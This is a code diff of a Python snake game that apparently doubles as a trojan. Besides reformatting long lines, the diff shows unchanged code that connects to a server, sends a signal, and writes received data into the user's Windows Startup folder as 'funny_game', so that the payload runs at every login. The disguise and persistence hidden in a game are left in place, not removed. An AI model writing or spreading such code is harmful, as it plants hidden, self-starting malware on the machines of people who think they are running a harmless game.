@@ -103,8 +103,10 @@ my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
 signal = 'g'.encode()
 my_socket.send(signal)
 user_name = os.getlogin()
-location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\funny_game".format(
-    user_name)
+location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
+           "\\Windows\\Start Menu\\Programs\\" \
+           "Startup\\funny_game".format(
+                user_name)
 with open(location, "wb") as f:
     done = False
     while not done:
@@ -126,7 +128,8 @@ while True:
     wn.update()
 
     # Check for a collision with the border
-    if head.xcor() > 290 or head.xcor() < -290 or head.ycor() > 290 or head.ycor() < -290:
+    if head.xcor() > 290 or head.xcor() < -290 or \
+            head.ycor() > 290 or head.ycor() < -290:
         time.sleep(1)
         head.goto(0, 0)
         head.direction = "stop"
